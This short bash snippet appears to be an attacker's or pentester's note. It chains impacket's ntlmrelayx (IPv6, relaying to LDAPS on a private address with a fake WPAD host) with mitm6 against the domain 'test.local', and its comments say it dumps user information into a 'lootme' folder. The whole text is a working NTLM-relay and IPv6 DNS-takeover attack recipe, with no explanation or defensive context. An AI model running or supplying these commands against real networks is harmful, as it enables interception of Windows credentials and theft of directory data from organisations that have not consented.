```bash
#dumps users info
sudo /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -6 -t ldaps://192.168.1.56 -wh fakewpad.test.local -l lootme
sudo mitm6 -d test.local
#and see the lootme dir and logs
```